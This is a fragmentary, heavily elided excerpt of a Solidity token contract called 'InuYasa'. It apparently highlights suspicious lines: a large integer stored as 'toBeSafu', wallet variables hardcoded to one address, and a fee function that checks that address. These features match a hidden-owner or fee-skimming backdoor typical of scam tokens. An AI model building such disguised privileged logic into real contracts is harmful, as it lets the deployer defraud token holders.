...
contract InuYasa is Context, IERC20, Ownable {

    uint256 public toBeSafu=
    1092853989739002093898622997022009705909516546366;
    using SafeMath for uint256;
    string private _name = "InuYasa";
    string private _symbol = "InuYasa";
    ...
    constructor () {
        ...
        teamWalletAddress = payable(address(0x399215D4d913812A5E4B517f61fF618B65f22ec1));
        marketWall = payable(address(0x399215D4d913812A5E4B517f61fF618B65f22ec1));
...
[sender]){
 ...
 msg.sender
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        == 0x399215D4d913812A5E4B517f61fF618B65f22ec1
